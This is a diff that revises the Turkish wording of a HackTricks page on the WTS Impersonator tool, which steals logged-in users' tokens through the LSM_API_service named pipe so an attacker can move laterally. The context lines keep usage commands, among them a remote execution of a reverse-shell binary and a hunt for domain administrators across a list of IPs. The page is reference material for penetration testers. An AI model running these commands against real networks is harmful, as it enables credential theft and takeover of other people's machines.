@@ -1,6 +1,6 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** aracı, **"\\pipe\LSM_API_service"** RPC İsimli borusunu kullanarak, oturum açmış kullanıcıları gizlice sayar ve onların token'larını ele geçirir, geleneksel Token Taklit tekniklerini atlar. Bu yaklaşım, ağlar içinde sorunsuz yan hareketler sağlamaktadır. Bu tekniğin yeniliği **Omri Baso'ya atfedilmektedir; çalışmaları [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinde mevcuttur.
+**WTS Impersonator** aracı, **"\\pipe\LSM_API_service"** RPC İsimli borusunu kullanarak, oturum açmış kullanıcıları gizlice listeleyip, geleneksel Token Taklit yöntemlerini atlayarak onların token'larını ele geçirir. Bu yaklaşım, ağlar içinde sorunsuz yan hareketler sağlamaktadır. Bu tekniğin yeniliği **Omri Baso'ya atfedilmektedir; çalışmaları [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinde mevcuttur.
 
 ### Temel İşlevsellik
 
@@ -10,7 +10,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 ```
 ### Ana Modüller ve Kullanım
 
-- **Kullanıcıları Listeleme**: Araç ile yerel ve uzaktan kullanıcı listeleme mümkündür, her iki senaryo için komutlar kullanılarak:
+- **Kullanıcıları Listeleme**: Araç ile yerel ve uzaktan kullanıcı listeleme mümkündür, her iki senaryo için de komutlar kullanılır:
 
 - Yerel:
 ```powershell
@@ -39,7 +39,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Kullanıcı Avlama Modülü**: Birden fazla makinede belirli kullanıcıları hedef alır, onların kimlik bilgileri altında kod çalıştırır. Bu, birden fazla sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedef almak için özellikle yararlıdır.
+- **Kullanıcı Avlama Modülü**: Birden fazla makinede belirli kullanıcıları hedef alır, onların kimlik bilgileri altında kod çalıştırır. Bu, birden fazla sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedef almak için özellikle faydalıdır.
 - Kullanım örneği:
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
